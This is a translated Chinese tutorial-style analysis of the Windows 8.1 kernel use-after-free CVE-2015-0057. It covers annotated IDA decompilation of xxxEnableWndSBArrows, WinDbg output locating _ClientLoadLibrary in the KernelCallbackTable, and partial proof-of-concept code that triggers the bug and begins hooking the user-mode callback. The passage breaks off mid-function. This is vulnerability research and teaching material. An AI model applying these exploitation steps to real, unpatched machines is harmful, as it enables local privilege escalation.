# CVE-2015-0057：从Windows内核UAF到内核桌面堆分配
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
本篇文章主要是对Windows内核漏洞CVE-2015-0057进行分析，漏洞的知识点特别多，也阅读了很多的资料，也很感谢给予我帮助的一些师傅，总之我会详细的记录自己对这个漏洞的理解和分析，我主要想分享一些我的学习方法，比如拿到一个Poc，该如何调试，如何判断自己每一步做对了，拿到IDA反编译的结果，该如何分析等等，先介绍一下这个漏洞的一些信息
漏洞编号 | 漏洞类型 | 利用平台  
---|---|---  
CVE-2015-0057 | Use After Free | Windows 8.1  
也会就是说你在分析之前需要有下面的准备：
  * Windows 8.1 x64 未打补丁的一个虚拟机用来测试Exploit
  * Windows 7 x64 的一个虚拟机用来查询结构体
  * IDA + Windbg 静态分析加动态分析，天下无敌
## 漏洞分析
###  补丁对比
让我们先来直观感受一下补丁前后的对比，这里我们直接定位问题函数`xxxDrawScrollBar`
补丁前：
补丁后：
这里在xxxDrawScrollBar函数后加了一层检验，主要是对[rdi+B0h]处结构的检测，这个函数其实很有意思，他相当于一个通道可以实现ring0内核层到ring3用户层在到ring0内核层的一条路，然而在路径到达ring3用户层的时候，我们完全可以干很多很多嘿嘿嘿的事情，怎么利用的我后面会慢慢道来，我们还是先看看这个函数是啥东西，连函数的功能都不知道怎么回事的话，是不可能完全理解这个漏洞的，漏洞函数是在`xxxEnableWndSBArrows`，首先我们将IDA反编译的结果拿来看，当然你直接看会是下面的结果，我也没有必要全部复制下来，总之直接看肯定看不出个所以然
    __int64 __fastcall xxxEnableWndSBArrows(struct tagWND *a1, int a2, int a3)
    {
      int *v3; // rbx
      unsigned int v4; // er12
      int v5; // ebp
      int v6; // er15
      struct tagWND *v7; // rdi
      int v8; // esi
      HDC v9; // r14
      struct tagWND *v11; // rcx
      struct tagWND *v12; // rcx
      v3 = (int *)*((_QWORD *)a1 + 22);
      v4 = 0;
      v5 = a3;
      v6 = a2;
      v7 = a1;
      [...]
    }
这里有几个方法，第一，看别人的分析文章，得到结构体数据分析函数流程。第二，在网上下一个Windows
NT或者ReactOS源码（当然也有[在线网站](https://doxygen.reactos.org/)，对照代码分析函数流程。第三，自己从头开始逆win32k.sys（仅限大佬。第四，在Windows
7 x64下用windbg中的dt命令查看结构体，自己分析得到Windows 8.1的结构体。这里我直接放有一些注释的反编译结果
    _BOOL8 __fastcall xxxEnableWndSBArrows(struct tagWND *pwnd, UINT wSBflags, UINT wArrow)
    {
      int *psbInfo; // rbx
      BOOL return_flag; // er12
      UINT wArrows_; // ebp
      UINT wSBflags_; // er15
      struct tagWND *pwnd_; // rdi
      int v8; // esi
      HDC v9; // r14
      struct tagWND *v11; // rcx
      struct tagWND *v12; // rcx
      psbInfo = (int *)*((_QWORD *)pwnd + 22);
      return_flag = 0;
      wArrows_ = wArrow;
      wSBflags_ = wSBflags;
      pwnd_ = pwnd;
      if ( psbInfo )
      {
        v8 = *psbInfo;
      }
      else
      {
        if ( !wArrow )
          return 0i64;
        v8 = 0;
        psbInfo = (int *)InitPwSB();
        if ( !psbInfo )
          return 0i64;
      }
      v9 = (HDC)GetDCEx(pwnd_, 0i64, 65537i64);
      if ( !v9 )
        return 0i64;
      if ( !wSBflags_ || wSBflags_ == 3 )           // 这里会判断wSBflags是否为0或3
      {
        if ( wArrows_ )                             // 这里判断wArrows是否为0
          *psbInfo |= wArrows_;
        else
          *psbInfo &= 0xFFFFFFFC;
        if ( *psbInfo != v8 )
        {
          return_flag = 1;
          v8 = *psbInfo;
          if ( *((_BYTE *)pwnd_ + 40) & 4 )
          {
            if ( !(*((_BYTE *)pwnd_ + 55) & 0x20) && (unsigned int)IsVisible(pwnd_) )
              xxxDrawScrollBar(v12, v9, 0);         // 这里会产生一次用户模式回调
          }
        }
        if ( ((unsigned __int8)v8 ^ *(_BYTE *)psbInfo) & 1 )
          xxxWindowEvent(32778);
        if ( ((unsigned __int8)v8 ^ *(_BYTE *)psbInfo) & 2 )
          xxxWindowEvent(32778);
      }
      if ( !((wSBflags_ - 1) & 0xFFFFFFFD) )
      {
        *psbInfo = wArrows_ ? (4 * wArrows_) | *psbInfo : *psbInfo & 0xFFFFFFF3; // 这里我们可以改结构体里面的一些东西
        if ( *psbInfo != v8 )
        {
          return_flag = 1;
          if ( *((_BYTE *)pwnd_ + 40) & 2 && !(*((_BYTE *)pwnd_ + 55) & 0x20) && (unsigned int)IsVisible(pwnd_) )
            xxxDrawScrollBar(v11, v9, 1);
          if ( ((unsigned __int8)v8 ^ *(_BYTE *)psbInfo) & 4 )
            xxxWindowEvent(32778);
          if ( ((unsigned __int8)v8 ^ *(_BYTE *)psbInfo) & 8 )
            xxxWindowEvent(32778);
        }
      }
      ReleaseDC(v9);
      return return_flag;
    }
###  Poc的构造
**窗口的创建**
漏洞利用，肯定第一步得到漏洞点嘛，我们先到漏洞点，然后再看漏洞触发能够给我们带来什么东西，再进一步思考利用方法，首先需要我们熟悉几个api函数，首先我们通过IDA的交叉引用可以找到`xxxEnableWndSBArrows`函数的原型`NtUserEnableScrollBar`然后我们可以找到用户层对应的函数
**EnableScrollBar**
    // The EnableScrollBar function enables or disables one or both scroll bar arrows.
    BOOL EnableScrollBar(
      HWND hWnd,
      UINT wSBflags,
      UINT wArrows
    );
函数的作用就是设置滚动箭头啥的，我们这里只需要关注怎么通过代码才能到达漏洞点？既然是滚动条设定，那我们第一步肯定得创建一个窗口吧，所以第一步肯定是创建一个窗口，这一步相信大家都是很清楚的，创建窗口类，注册窗口，创建窗口一气呵成，这不是很简单么？所以我们火速写了下面几个片断
    WNDCLASSEXA wc;
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = DefWindowProcA;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = GetModuleHandleA(NULL);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = szClassName;
    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
    RegisterClassExA(&wc)
当你写到 CreateWindowExA
函数时，发现那么多参数，肯定不能随便设置就到漏洞点吧，回顾上面IDA的分析，我们需要让wSBflags设置为0和3，并且wArrows不能为0，所以这里我们在
**EnableScrollBar** 函数中的实现就是对第二个参数进行设置，我们构造如下的片断
    EnableScrollBar(
            hWnd, 
            SB_CTL | SB_BOTH, // wSBflags = 3 滚动条是滚动条控件,启用或禁用与指定窗口关联的水平和垂直滚动条上的箭头
            ESB_DISABLE_BOTH  // wArrows  = 3 禁用滚动条上的两个箭头
        );
既然 EnableScrollBar
函数设置如上，那么就意味着我们创建的窗口必须满足拥有滚动条控件，为了同时能操作水平和垂直滚动条，必须以某种方式创建具有这两个元素的滚动条控件，所以我们进行如下的构造
    hWnd = CreateWindowExA(
        0,
        szClassName,
        0,
        SBS_HORZ | WS_HSCROLL | WS_VSCROLL, // 垂直加水平
        10,
        10,
        100,
        100,
        NULL,
        NULL,
        NULL,
        NULL
    );
期间我们再加上ShowWindow和UpdateWindow两个函数确保我们的窗口可见
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);
那么我们初步构造出能够抵达漏洞点的初步Poc，动态过程如下
**回调函数的利用**
接下来我们就需要考虑如何利用这个回调函数了，首先我们了解一下这个回调函数，这里我直接放一张图片，很清楚的说明了调用关系，图片来自[Udi师傅的文章](https://blog.ensilo.com/one-bit-to-rule-them-all-bypassing-windows-10-protections-using-a-single-bit)
上面的调用关系你可以手动通过IDA一步一步的点，这里我们关注几个关键点，我们最后从ring0到ring3的接口是通过 KeUserModeCallback
函数到达的，倒数第二个函数是 ClientLoadLibrary ，下面介绍一下这两个函数的关系。通常，每个进程有一个由
PEB->KernelCallBackTable 指向的用户模式回调函数指针表。当内核想调用用户模式函数时，它就把函数索引号传递给
KeUserModeCallBack()。在上面的例子中，索引号指向用户态的 _ClientLoadLibrary
函数，那么下面我们在PEB中找找这个结构，可以找到，偏移为0x238
    1: kd> dt !_PEB @$peb -r KernelCallbackTable
    ntdll!_PEB
       +0x058 KernelCallbackTable : 0x00007ffb`dc110a80 Void
    1: kd> dqs 0x00007ffb`dc110a80
    00007ffb`dc110a80  00007ffb`dc0f3ef0 USER32!_fnCOPYDATA
    00007ffb`dc110a88  00007ffb`dc14adb0 USER32!_fnCOPYGLOBALDATA
    00007ffb`dc110a90  00007ffb`dc0e3b90 USER32!_fnDWORD
    00007ffb`dc110a98  00007ffb`dc0e59b0 USER32!_fnNCDESTROY
    00007ffb`dc110aa0  00007ffb`dc0f5640 USER32!_fnDWORDOPTINLPMSG
    00007ffb`dc110aa8  00007ffb`dc14b2b0 USER32!_fnINOUTDRAG
    00007ffb`dc110ab0  00007ffb`dc0f3970 USER32!_fnGETTEXTLENGTHS
    00007ffb`dc110ab8  00007ffb`dc11f1c0 USER32!__fnINCNTOUTSTRING
    00007ffb`dc110ac0  00007ffb`dc14b5b0 USER32!_fnINCNTOUTSTRINGNULL
    00007ffb`dc110ac8  00007ffb`dc14b1a0 USER32!_fnINLPCOMPAREITEMSTRUCT
    00007ffb`dc110ad0  00007ffb`dc0e65a0 USER32!__fnINLPCREATESTRUCT
    00007ffb`dc110ad8  00007ffb`dc11eb10 USER32!_fnINLPDELETEITEMSTRUCT
    00007ffb`dc110ae0  00007ffb`dc115820 USER32!__fnINLPDRAWITEMSTRUCT
    00007ffb`dc110ae8  00007ffb`dc0f9610 USER32!_fnINLPHELPINFOSTRUCT
    00007ffb`dc110af0  00007ffb`dc0f9610 USER32!_fnINLPHELPINFOSTRUCT
    00007ffb`dc110af8  00007ffb`dc11d7e0 USER32!__fnINLPMDICREATESTRUCT
    [...]
    00007ffb`dc110cb8  00007ffb`dc0e8530 USER32!_ClientLoadLibrary
    1: kd> ? (00007ffb`dc110cb8-00007ffb`dc110a80)
    Evaluate expression: 568 = 00000000`00000238
我们既然找到了它的位置，并且知道它和PEB有关，那我们就可以在ring3通过寄存器的方式访问到 _ClientLoadLibrary
的位置并且hook掉它，因为在前面的代码中我们只是单纯的创建和显示了一个带有一些属性的窗口，这里hook自然也就想到了将它释放到，如果我们将其释放掉，后面函数流程中又对其一些结构进行访问，那肯定是回出问题的，所以我们一步一步来，先获取hook的地址
    ULONG_PTR Get_ClientLoadLibrary()
    {
        return (ULONG_PTR)*(ULONG_PTR*)(__readgsqword(0x60) + 0x58) + 0x238; // 首先获取PEB,然后根据偏移找到KernelCallbackTable,最后找到__ClientLoadLibrary
    }
然后我们将其hook掉
    BOOL Hook__ClientLoadLibrary()
    {
        DWORD dwOldProtect;
        _ClientLoadLibrary_addr = Get_ClientLoadLibrary();
        _ClientLoadLibrary = (fct_clLoadLib) * (ULONG_PTR*)_ClientLoadLibrary_addr;
        Hook__ClientLoadLibrary();